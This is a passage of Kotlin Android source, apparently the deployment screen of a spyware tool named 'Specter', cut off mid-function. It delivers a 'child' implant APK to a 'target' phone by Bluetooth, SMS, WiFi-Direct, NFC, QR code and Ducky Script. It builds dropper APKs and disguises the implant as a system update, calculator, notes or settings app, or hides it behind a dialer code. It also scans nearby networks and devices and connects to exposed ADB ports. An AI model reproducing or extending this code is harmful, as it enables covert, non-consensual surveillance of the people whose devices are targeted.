                                val device = selectedBluetoothDevice!!
                                val apkFile = java.io.File(app.applicationContext.cacheDir, "specter-child.apk")

                                bluetoothTransfer.setTransferListener(object : com.divine.specter.delivery.BluetoothTransfer.TransferListener {
                                    override fun onConnecting(deviceName: String) {
                                        bluetoothProgress = "Connecting to $deviceName..."
                                        bluetoothError = null
                                    }

                                    override fun onConnected(deviceName: String) {
                                        bluetoothProgress = "Connected. Sending APK..."
                                    }

                                    override fun onProgress(bytesSent: Long, totalBytes: Long, percentage: Float) {
                                        bluetoothProgress = "Sending: ${percentage.toInt()}%"
                                    }

                                    override fun onComplete(bytesSent: Long) {
                                        bluetoothProgress = null
                                        bluetoothError = null
                                        scope.launch {
                                            bluetoothProgress = "✓ Transfer complete"
                                        }
                                    }

                                    override fun onFailed(error: String) {
                                        bluetoothProgress = null
                                        bluetoothError = error
                                    }
                                })

                                scope.launch {
                                    // Extract APK to cache
                                    try {
                                        val inputStream = app.applicationContext.assets.open("specter-child.apk")
                                        val outputStream = apkFile.outputStream()
                                        inputStream.copyTo(outputStream)
                                        inputStream.close()
                                        outputStream.close()

                                        bluetoothTransfer.sendApk(apkFile, device.first)
                                    } catch (e: Exception) {
                                        bluetoothError = "Failed to prepare APK: ${e.message}"
                                        bluetoothProgress = null
                                    }
                                }
                            }
                        )

                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "⚠ Target device must have Bluetooth receiver app installed",
                            style = TextStyle(
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Orange
                            )
                        )
                        Text(
                            "Child app will auto-install after receiving APK",
                            style = TextStyle(
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextMuted
                            )
                        )
                    }
                }
            }
        }

        // Child App Configuration (Stealth)
        CyberSectionHeader(title = "// CHILD_CONFIG", color = Cyber.Magenta)

        CyberCard(borderColor = Cyber.Magenta) {
            Column(modifier = Modifier.padding(16.dp)) {
                // Expandable header
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clickable { stealthExpanded = !stealthExpanded },
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            Icons.Default.VisibilityOff,
                            contentDescription = null,
                            tint = Cyber.Magenta
                        )
                        Column {
                            Text(
                                "STEALTH_MODE",
                                style = TextStyle(
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Magenta
                                )
                            )
                            Text(
                                "Disguise: ${currentDisguiseMode.displayName}",
                                style = TextStyle(
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.TextSecondary
                                )
                            )
                        }
                    }
                    Icon(
                        if (stealthExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                        contentDescription = null,
                        tint = Cyber.Magenta
                    )
                }

                // Expanded content
                androidx.compose.animation.AnimatedVisibility(visible = stealthExpanded) {
                    Column(
                        modifier = Modifier.padding(top = 16.dp),
                        verticalArrangement = Arrangement.spacedBy(12.dp)
                    ) {
                        // Info
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                Icons.Default.Info,
                                contentDescription = null,
                                tint = Cyber.Orange,
                                modifier = Modifier.size(16.dp)
                            )
                            Text(
                                "Configure how child app appears on TARGET device",
                                style = TextStyle(
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Orange
                                )
                            )
                        }

                        Divider(color = Cyber.Magenta.copy(alpha = 0.3f))

                        // Disguise mode options
                        Text(
                            "TARGET_APPEARANCE",
                            style = TextStyle(
                                fontSize = 11.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextMuted
                            )
                        )

                        StealthManager.DisguiseMode.entries.forEach { mode ->
                            val (icon, desc) = when (mode) {
                                StealthManager.DisguiseMode.SYSTEM_UPDATE -> Icons.Default.SystemUpdate to "System Update"
                                StealthManager.DisguiseMode.CALCULATOR -> Icons.Default.Calculate to "Calculator"
                                StealthManager.DisguiseMode.NOTES -> Icons.Default.Note to "Notes"
                                StealthManager.DisguiseMode.SETTINGS -> Icons.Default.Settings to "Device Settings"
                                StealthManager.DisguiseMode.HIDDEN -> Icons.Default.VisibilityOff to "Hidden (dialer code)"
                            }
                            val isSelected = currentDisguiseMode == mode

                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clickable { scope.launch { stealthManager.setDisguiseMode(mode) } }
                                    .background(
                                        if (isSelected) Cyber.Magenta.copy(alpha = 0.1f) else androidx.compose.ui.graphics.Color.Transparent,
                                        RoundedCornerShape(8.dp)
                                    )
                                    .padding(12.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Row(
                                    horizontalArrangement = Arrangement.spacedBy(12.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Icon(
                                        icon,
                                        contentDescription = null,
                                        tint = if (isSelected) Cyber.Magenta else Cyber.TextMuted,
                                        modifier = Modifier.size(20.dp)
                                    )
                                    Text(
                                        desc.uppercase(),
                                        style = TextStyle(
                                            fontSize = 12.sp,
                                            fontFamily = FontFamily.Monospace,
                                            color = if (isSelected) Cyber.Magenta else Cyber.TextPrimary
                                        )
                                    )
                                }
                                if (isSelected) {
                                    Icon(
                                        Icons.Default.CheckCircle,
                                        contentDescription = null,
                                        tint = Cyber.Magenta,
                                        modifier = Modifier.size(18.dp)
                                    )
                                }
                            }
                        }

                        Divider(color = Cyber.Magenta.copy(alpha = 0.3f))

                        // Activation code
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Column {
                                Text(
                                    "ACTIVATION_CODE",
                                    style = TextStyle(
                                        fontSize = 11.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.TextMuted
                                    )
                                )
                                Text(
                                    activationCode,
                                    style = TextStyle(
                                        fontSize = 14.sp,
                                        fontWeight = FontWeight.Bold,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.ElectricBlue
                                    )
                                )
                            }
                            IconButton(onClick = { showCodeDialog = true }) {
                                Icon(
                                    Icons.Default.Edit,
                                    contentDescription = "Change code",
                                    tint = Cyber.ElectricBlue
                                )
                            }
                        }
                        Text(
                            "Dial this code on target to reveal hidden app",
                            style = TextStyle(
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextMuted
                            )
                        )
                    }
                }
            }
        }

        // Activation code dialog
        if (showCodeDialog) {
            var newCode by remember { mutableStateOf("") }
            AlertDialog(
                onDismissRequest = { showCodeDialog = false },
                containerColor = Cyber.DarkGray,
                title = {
                    Text(
                        "// ACTIVATION_CODE",
                        style = TextStyle(
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            color = Cyber.ElectricBlue
                        )
                    )
                },
                text = {
                    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                        Text(
                            "CURRENT: $activationCode",
                            style = TextStyle(
                                fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextMuted
                            )
                        )
                        OutlinedTextField(
                            value = newCode,
                            onValueChange = { newCode = it },
                            label = { Text("NEW_CODE", color = Cyber.TextMuted) },
                            placeholder = { Text("*#*#1234#*#*", color = Cyber.TextMuted) },
                            singleLine = true,
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Cyber.ElectricBlue,
                                unfocusedBorderColor = Cyber.MediumGray,
                                focusedTextColor = Cyber.TextPrimary,
                                unfocusedTextColor = Cyber.TextSecondary,
                                cursorColor = Cyber.ElectricBlue
                            ),
                            textStyle = TextStyle(fontFamily = FontFamily.Monospace)
                        )
                    }
                },
                confirmButton = {
                    TextButton(
                        onClick = {
                            if (newCode.isNotEmpty()) {
                                scope.launch { stealthManager.setActivationCode(newCode) }
                                showCodeDialog = false
                            }
                        }
                    ) {
                        Text("APPLY", color = Cyber.ElectricBlue, fontFamily = FontFamily.Monospace)
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showCodeDialog = false }) {
                        Text("CANCEL", color = Cyber.TextMuted, fontFamily = FontFamily.Monospace)
                    }
                }
            )
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Delivery Methods - All options equally available
        CyberSectionHeader(title = "// DELIVERY_METHODS", color = Cyber.Cyan)

        // Show selected MAC banner if a device was selected for Bluetooth
        if (selectedBluetoothMac != null) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp),
                color = Cyber.Cyan.copy(alpha = 0.15f),
                border = ButtonDefaults.outlinedButtonBorder.copy(
                    brush = Brush.horizontalGradient(
                        listOf(Cyber.Cyan.copy(0.6f), Cyber.Cyan.copy(0.2f))
                    )
                )
            ) {
                Row(
                    modifier = Modifier.padding(12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            Icons.Default.Bluetooth,
                            contentDescription = null,
                            tint = Cyber.Cyan,
                            modifier = Modifier.size(20.dp)
                        )
                        Column {
                            Text(
                                "BLUETOOTH_TARGET_SET",
                                style = TextStyle(
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Cyan
                                )
                            )
                            Text(
                                selectedBluetoothMac!!,
                                style = TextStyle(
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.TextSecondary
                                )
                            )
                        }
                    }
                    IconButton(
                        onClick = { selectedBluetoothMac = null },
                        modifier = Modifier.size(24.dp)
                    ) {
                        Icon(
                            Icons.Default.Close,
                            contentDescription = "Clear",
                            tint = Cyber.TextMuted,
                            modifier = Modifier.size(16.dp)
                        )
                    }
                }
            }
            Spacer(modifier = Modifier.height(8.dp))
        }

        DeliveryMethodsCard(
            apkFile = if (apkAvailable) File(app.applicationContext.cacheDir, "specter-child.apk") else null,
            apkSize = formatSize(apkSize),
            onSendSms = { phoneNumber ->
                // Check SMS permission first
                val context = app.applicationContext
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                    == PackageManager.PERMISSION_GRANTED) {
                    // Permission already granted - proceed directly
                    val apkFile = File(context.cacheDir, "specter-child.apk")
                    smsApkSender.setListener(object : com.divine.specter.delivery.SmsApkSender.SendListener {
                        override fun onProgress(chunksSent: Int, totalChunks: Int, percentage: Float) {
                            bluetoothProgress = "SMS: $chunksSent/$totalChunks (${percentage.toInt()}%)"
                            bluetoothError = null
                        }
                        override fun onComplete(totalSent: Int) {
                            bluetoothProgress = "✓ SMS complete: $totalSent messages sent"
                            bluetoothError = null
                        }
                        override fun onFailed(error: String, chunksFailed: Int) {
                            bluetoothProgress = null
                            bluetoothError = "SMS failed: $error"
                        }
                    })
                    scope.launch {
                        if (!extractApkToCache()) {
                            bluetoothError = "Failed to extract APK"
                            return@launch
                        }
                        bluetoothProgress = "Preparing SMS delivery..."
                        smsApkSender.sendApk(apkFile, phoneNumber)
                    }
                } else {
                    // Request permission - store phone number for callback
                    pendingSmsPhone = phoneNumber
                    smsPermissionLauncher.launch(Manifest.permission.SEND_SMS)
                }
            },
            onSendBluetooth = { deviceAddress ->
                // Check Bluetooth permission first (BLUETOOTH_CONNECT on Android 12+)
                val context = app.applicationContext
                val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    Manifest.permission.BLUETOOTH_CONNECT
                } else {
                    Manifest.permission.BLUETOOTH
                }

                if (ContextCompat.checkSelfPermission(context, permission)
                    == PackageManager.PERMISSION_GRANTED) {
                    // Permission already granted - proceed directly
                    val apkFile = File(context.cacheDir, "specter-child.apk")
                    bluetoothTransfer.setTransferListener(object : com.divine.specter.delivery.BluetoothTransfer.TransferListener {
                        override fun onConnecting(deviceName: String) {
                            bluetoothProgress = "Connecting to $deviceName..."
                            bluetoothError = null
                        }
                        override fun onConnected(deviceName: String) {
                            bluetoothProgress = "Connected. Sending APK..."
                        }
                        override fun onProgress(bytesSent: Long, totalBytes: Long, percentage: Float) {
                            bluetoothProgress = "Sending: ${percentage.toInt()}%"
                        }
                        override fun onComplete(bytesSent: Long) {
                            bluetoothProgress = "✓ Transfer complete ($bytesSent bytes)"
                            bluetoothError = null
                        }
                        override fun onFailed(error: String) {
                            bluetoothProgress = null
                            bluetoothError = error
                        }
                    })
                    scope.launch {
                        if (!extractApkToCache()) {
                            bluetoothError = "Failed to extract APK"
                            return@launch
                        }
                        bluetoothTransfer.sendApk(apkFile, deviceAddress)
                    }
                } else {
                    // Request permission - store address for callback
                    pendingBluetoothAddress = deviceAddress
                    bluetoothPermissionLauncher.launch(permission)
                }
            },
            onGenerateDropper = {
                val childApk = File(app.applicationContext.cacheDir, "specter-child.apk")
                val dropperOutput = File(app.applicationContext.getExternalFilesDir(null), "specter-dropper-${System.currentTimeMillis()}.apk")

                dropperGenerator.setListener(object : com.divine.specter.delivery.DropperGenerator.GenerateListener {
                    override fun onProgress(step: String) {
                        bluetoothProgress = step
                        bluetoothError = null
                    }

                    override fun onComplete(dropperFile: File) {
                        bluetoothProgress = "✓ Dropper generated: ${dropperFile.name}"
                        bluetoothError = null
                    }

                    override fun onFailed(error: String) {
                        bluetoothProgress = null
                        bluetoothError = "Dropper generation failed: $error"
                    }
                })

                scope.launch {
                    try {
                        // Extract child APK to cache
                        val inputStream = app.applicationContext.assets.open("specter-child.apk")
                        val outputStream = childApk.outputStream()
                        inputStream.copyTo(outputStream)
                        inputStream.close()
                        outputStream.close()

                        bluetoothProgress = "Starting dropper generation..."
                        dropperGenerator.generateDropper(childApk, dropperOutput)
                    } catch (e: Exception) {
                        bluetoothError = "Failed to prepare: ${e.message}"
                        bluetoothProgress = null
                    }
                }
            },
            prefilledBluetoothMac = selectedBluetoothMac,
            transferStatus = bluetoothProgress
        )

        Spacer(modifier = Modifier.height(16.dp))

        // Advanced Delivery Section (P2P methods)
        CyberSectionHeader(title = "// WIRELESS_P2P", color = Cyber.Orange)

        // Update server URL from parent if available
        LaunchedEffect(parentServerUrl) {
            if (parentServerUrl != null && altDeliveryServerUrl.isEmpty()) {
                altDeliveryServerUrl = parentServerUrl!!
            }
        }

        // WiFi-Direct Card
        WifiDirectCard(
            wifiDirectTransfer = wifiDirectTransfer,
            apkFile = if (apkAvailable) File(app.applicationContext.cacheDir, "specter-child.apk") else null,
            onRequestPermissions = { requestWifiDirectPermissions() }
        )

        Spacer(modifier = Modifier.height(8.dp))

        // NFC Deployment Card (only show if activity available)
        if (activity != null) {
            NfcDeploymentCard(
                activity = activity,
                serverUrl = altDeliveryServerUrl,
                onServerUrlChange = { altDeliveryServerUrl = it }
            )
            Spacer(modifier = Modifier.height(8.dp))
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Proximity Reconnaissance
        CyberSectionHeader(title = "// PROXIMITY_RECON", color = Cyber.Orange)

        // WiFi Network Scanner
        WifiScannerCard()
        Spacer(modifier = Modifier.height(8.dp))

        // Bluetooth Device Scanner
        BluetoothScannerCard(
            onSelectMac = { mac -> selectedBluetoothMac = mac }
        )
        Spacer(modifier = Modifier.height(8.dp))

        // BLE Beacon/Tracker Scanner
        BleScannerCard()
        Spacer(modifier = Modifier.height(8.dp))

        // mDNS/Bonjour Service Discovery
        MdnsScannerCard()
        Spacer(modifier = Modifier.height(8.dp))

        // UPnP/SSDP Device Discovery
        UpnpScannerCard()

        Spacer(modifier = Modifier.height(16.dp))

        // Specialized tools (QR Code, Ducky Script)
        CyberSectionHeader(title = "// SPECIALIZED_TOOLS", color = Cyber.Magenta)

        // QR Code Deployment Card
        QrCodeDeploymentCard(
            serverUrl = parentServerUrl,
            serverIp = getLocalIpAddress(),
            serverPort = 8855,
            deviceName = deviceName,
            onShare = { bitmap ->
                scope.launch {
                    try {
                        val context = app.applicationContext
                        val file = java.io.File(context.cacheDir, "qr_code.png")
                        file.outputStream().use { out ->
                            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
                        }
                        val uri = androidx.core.content.FileProvider.getUriForFile(
                            context,
                            "${context.packageName}.fileprovider",
                            file
                        )
                        val intent = android.content.Intent(android.content.Intent.ACTION_SEND).apply {
                            type = "image/png"
                            putExtra(android.content.Intent.EXTRA_STREAM, uri)
                            addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                    } catch (e: Exception) {
                        android.util.Log.e("DeployScreen", "Failed to share QR code", e)
                    }
                }
            }
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Ducky Script Card
        DuckyScriptCard(
            serverUrl = altDeliveryServerUrl,
            onServerUrlChange = { altDeliveryServerUrl = it }
        )

        Spacer(modifier = Modifier.height(80.dp))
    }

    // Uninstall Dialog
    if (showUninstallDialog) {
        AlertDialog(
            onDismissRequest = { showUninstallDialog = false },
            containerColor = Cyber.DarkGray,
            title = {
                Text(
                    "CONFIRM_REMOVAL",
                    style = TextStyle(
                        fontFamily = FontFamily.Monospace,
                        color = Cyber.Red
                    )
                )
            },
            text = {
                Text(
                    "This will remove the implant from target. Device will no longer be monitored.",
                    style = TextStyle(
                        fontFamily = FontFamily.Monospace,
                        color = Cyber.TextSecondary
                    )
                )
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        showUninstallDialog = false
                        scope.launch {
                            deploymentManager.uninstallChild()
                            childInfo = null
                        }
                    }
                ) {
                    Text("REMOVE", color = Cyber.Red)
                }
            },
            dismissButton = {
                TextButton(onClick = { showUninstallDialog = false }) {
                    Text("CANCEL", color = Cyber.TextMuted)
                }
            }
        )
    }
}

@Composable
private fun CyberConnectionForm(
    host: String,
    port: String,
    onHostChange: (String) -> Unit,
    onPortChange: (String) -> Unit,
    onConnect: () -> Unit
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        OutlinedTextField(
            value = host,
            onValueChange = onHostChange,
            label = { Text("IP", color = Cyber.TextMuted) },
            placeholder = { Text("192.168.1.x", color = Cyber.TextMuted) },
            singleLine = true,
            modifier = Modifier.weight(2f),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = Cyber.Cyan,
                unfocusedBorderColor = Cyber.MediumGray,
                focusedTextColor = Cyber.TextPrimary,
                unfocusedTextColor = Cyber.TextSecondary
            )
        )
        OutlinedTextField(
            value = port,
            onValueChange = onPortChange,
            label = { Text("PORT", color = Cyber.TextMuted) },
            singleLine = true,
            modifier = Modifier.weight(1f),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = Cyber.Cyan,
                unfocusedBorderColor = Cyber.MediumGray,
                focusedTextColor = Cyber.TextPrimary,
                unfocusedTextColor = Cyber.TextSecondary
            )
        )
    }

    Spacer(modifier = Modifier.height(12.dp))

    CyberButton(
        text = "ESTABLISH_LINK",
        color = Cyber.Cyan,
        onClick = onConnect
    )
}

private fun formatSize(bytes: Long): String {
    return when {
        bytes >= 1_000_000 -> "%.1f MB".format(bytes / 1_000_000.0)
        bytes >= 1_000 -> "%.1f KB".format(bytes / 1_000.0)
        else -> "$bytes bytes"
    }
}

@Composable
private fun CyberDeviceScanner(
    targetHost: String,
    targetPort: String,
    onHostChange: (String) -> Unit,
    onPortChange: (String) -> Unit,
    onScan: () -> Unit,
    onConnect: (String, Int) -> Unit,
    onSelectMacForBluetooth: (String) -> Unit = {}
) {
    // Get enhanced device info from NetworkScanner
    val app = SpecterApplication.instance
    val scannedDevices by app.networkScanner.devices.collectAsState()
    val scanState by app.networkScanner.scanState.collectAsState()
    val scanProgress by app.networkScanner.scanProgress.collectAsState()

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        // Scan Button with progress
        CyberButton(
            text = when (scanState) {
                is NetworkScanner.ScanState.Scanning -> "SCANNING... ${(scanProgress * 100).toInt()}%"
                else -> "SCAN_NETWORK"
            },
            color = Cyber.Magenta,
            enabled = scanState !is NetworkScanner.ScanState.Scanning,
            onClick = onScan
        )

        // Scan progress bar
        if (scanState is NetworkScanner.ScanState.Scanning) {
            LinearProgressIndicator(
                progress = scanProgress,
                modifier = Modifier.fillMaxWidth(),
                color = Cyber.Magenta,
                trackColor = Cyber.Magenta.copy(alpha = 0.2f)
            )
            Text(
                (scanState as NetworkScanner.ScanState.Scanning).phase,
                style = TextStyle(
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Cyber.TextSecondary
                )
            )
        }

        // Discovered Devices with fingerprinting info
        if (scannedDevices.isNotEmpty()) {
            Text(
                "FOUND ${scannedDevices.size} DEVICE(S):",
                style = TextStyle(
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Cyber.Lime
                )
            )

            scannedDevices.forEach { device ->
                val borderColor = when {
                    device.hasAdb -> Cyber.Lime
                    device.isAndroid -> Cyber.Cyan
                    else -> Cyber.Magenta
                }

                Surface(
                    onClick = { onConnect(device.ip, 5555) },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(8.dp),
                    color = borderColor.copy(alpha = 0.1f),
                    border = ButtonDefaults.outlinedButtonBorder.copy(
                        brush = Brush.horizontalGradient(
                            listOf(borderColor.copy(0.6f), borderColor.copy(0.2f))
                        )
                    )
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Device type icon
                            Icon(
                                when (device.deviceType) {
                                    NetworkScanner.DeviceType.PHONE -> Icons.Default.PhoneAndroid
                                    NetworkScanner.DeviceType.TABLET -> Icons.Default.TabletAndroid
                                    NetworkScanner.DeviceType.TV -> Icons.Default.Tv
                                    NetworkScanner.DeviceType.COMPUTER -> Icons.Default.Computer
                                    NetworkScanner.DeviceType.ROUTER -> Icons.Default.Wifi
                                    NetworkScanner.DeviceType.CAMERA -> Icons.Default.CameraAlt
                                    NetworkScanner.DeviceType.IOT -> Icons.Default.Memory
                                    else -> Icons.Default.DevicesOther
                                },
                                contentDescription = null,
                                tint = borderColor,
                                modifier = Modifier.size(28.dp)
                            )

                            Column(modifier = Modifier.weight(1f)) {
                                // Device name - full, no truncation
                                Text(
                                    device.displayName,
                                    style = TextStyle(
                                        fontSize = 13.sp,
                                        fontWeight = FontWeight.Bold,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.TextPrimary
                                    )
                                )
                                // Second row: IP + badges
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        device.ip,
                                        style = TextStyle(
                                            fontSize = 11.sp,
                                            fontFamily = FontFamily.Monospace,
                                            color = Cyber.TextSecondary
                                        )
                                    )
                                    // Status badges
                                    Row(
                                        horizontalArrangement = Arrangement.spacedBy(4.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        if (device.hasAdb) {
                                            Surface(
                                                shape = RoundedCornerShape(4.dp),
                                                color = Cyber.Lime.copy(alpha = 0.2f)
                                            ) {
                                                Text(
                                                    "ADB",
                                                    style = TextStyle(
                                                        fontSize = 9.sp,
                                                        fontWeight = FontWeight.Bold,
                                                        fontFamily = FontFamily.Monospace,
                                                        color = Cyber.Lime
                                                    ),
                                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                                )
                                            }
                                        }
                                        Surface(
                                            shape = RoundedCornerShape(4.dp),
                                            color = Cyber.Cyan.copy(alpha = 0.15f)
                                        ) {
                                            Text(
                                                device.deviceType.name,
                                                style = TextStyle(
                                                    fontSize = 8.sp,
                                                    fontFamily = FontFamily.Monospace,
                                                    color = Cyber.TextMuted
                                                ),
                                                modifier = Modifier.padding(horizontal = 4.dp, vertical = 2.dp)
                                            )
                                        }
                                    }
                                }
                            }
                        }

                        // Additional info row (MAC, services)
                        if (device.mac != null || device.openPorts.isNotEmpty()) {
                            Spacer(modifier = Modifier.height(6.dp))
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                // MAC Address (useful for Bluetooth)
                                if (device.mac != null) {
                                    Row(
                                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Text(
                                            "MAC: ${device.mac}",
                                            style = TextStyle(
                                                fontSize = 9.sp,
                                                fontFamily = FontFamily.Monospace,
                                                color = Cyber.Cyan
                                            )
                                        )
                                        // Use for Bluetooth button
                                        Surface(
                                            onClick = { onSelectMacForBluetooth(device.mac!!) },
                                            shape = RoundedCornerShape(4.dp),
                                            color = Cyber.Cyan.copy(alpha = 0.2f),
                                            border = ButtonDefaults.outlinedButtonBorder.copy(
                                                brush = Brush.horizontalGradient(
                                                    listOf(Cyber.Cyan.copy(0.6f), Cyber.Cyan.copy(0.3f))
                                                )
                                            )
                                        ) {
                                            Row(
                                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                                horizontalArrangement = Arrangement.spacedBy(4.dp),
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                Icon(
                                                    Icons.Default.Bluetooth,
                                                    contentDescription = null,
                                                    tint = Cyber.Cyan,
                                                    modifier = Modifier.size(12.dp)
                                                )
                                                Text(
                                                    "USE",
                                                    style = TextStyle(
                                                        fontSize = 8.sp,
                                                        fontWeight = FontWeight.Bold,
                                                        fontFamily = FontFamily.Monospace,
                                                        color = Cyber.Cyan
                                                    )
                                                )
                                            }
                                        }
                                    }
                                }
                                // Open services - clickable actions
                                if (device.openPorts.isNotEmpty()) {
                                    val context = LocalContext.current
                                    val clipboardManager = context.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager

                                    Row(
                                        horizontalArrangement = Arrangement.spacedBy(4.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        device.openPorts.forEach { (port, service) ->
                                            Surface(
                                                onClick = {
                                                    when (port) {
                                                        80 -> {
                                                            // Open HTTP in browser
                                                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("http://${device.ip}"))
                                                            context.startActivity(intent)
                                                        }
                                                        443 -> {
                                                            // Open HTTPS in browser
                                                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("https://${device.ip}"))
                                                            context.startActivity(intent)
                                                        }
                                                        22 -> {
                                                            // Copy SSH command
                                                            val clip = android.content.ClipData.newPlainText("SSH", "ssh root@${device.ip}")
                                                            clipboardManager.setPrimaryClip(clip)
                                                            android.widget.Toast.makeText(context, "Copied: ssh root@${device.ip}", android.widget.Toast.LENGTH_SHORT).show()
                                                        }
                                                        554, 8554 -> {
                                                            // Copy RTSP URL
                                                            val rtspUrl = "rtsp://${device.ip}:$port/stream"
                                                            val clip = android.content.ClipData.newPlainText("RTSP", rtspUrl)
                                                            clipboardManager.setPrimaryClip(clip)
                                                            android.widget.Toast.makeText(context, "Copied: $rtspUrl", android.widget.Toast.LENGTH_SHORT).show()
                                                        }
                                                        1883 -> {
                                                            // Copy MQTT broker address
                                                            val clip = android.content.ClipData.newPlainText("MQTT", "mqtt://${device.ip}:1883")
                                                            clipboardManager.setPrimaryClip(clip)
                                                            android.widget.Toast.makeText(context, "Copied MQTT broker", android.widget.Toast.LENGTH_SHORT).show()
                                                        }
                                                        5555 -> {
                                                            // Connect via ADB
                                                            onConnect(device.ip, 5555)
                                                        }
                                                        else -> {
                                                            // Copy generic connection info
                                                            val clip = android.content.ClipData.newPlainText("Port", "${device.ip}:$port")
                                                            clipboardManager.setPrimaryClip(clip)
                                                            android.widget.Toast.makeText(context, "Copied: ${device.ip}:$port", android.widget.Toast.LENGTH_SHORT).show()
                                                        }
                                                    }
                                                },
                                                shape = RoundedCornerShape(4.dp),
                                                color = Cyber.Orange.copy(alpha = 0.2f)
                                            ) {
                                                Text(
                                                    service,
                                                    style = TextStyle(
                                                        fontSize = 9.sp,
                                                        fontWeight = FontWeight.Bold,
                                                        fontFamily = FontFamily.Monospace,
                                                        color = Cyber.Orange
                                                    ),
                                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else if (scanState !is NetworkScanner.ScanState.Scanning) {
            // Manual entry fallback
            Text(
                "OR ENTER MANUALLY:",
                style = TextStyle(
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Cyber.TextMuted
                )
            )
            CyberConnectionForm(targetHost, targetPort, onHostChange, onPortChange) {
                onConnect(targetHost.ifBlank { "localhost" }, targetPort.toIntOrNull() ?: 5555)
            }
        }
    }
}

private fun getLocalIpAddress(): String {
    try {
        val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
        while (interfaces.hasMoreElements()) {
            val iface = interfaces.nextElement()
            val addresses = iface.inetAddresses
            while (addresses.hasMoreElements()) {
                val addr = addresses.nextElement()
                if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                    return addr.hostAddress ?: "localhost"
                }
            }
        }
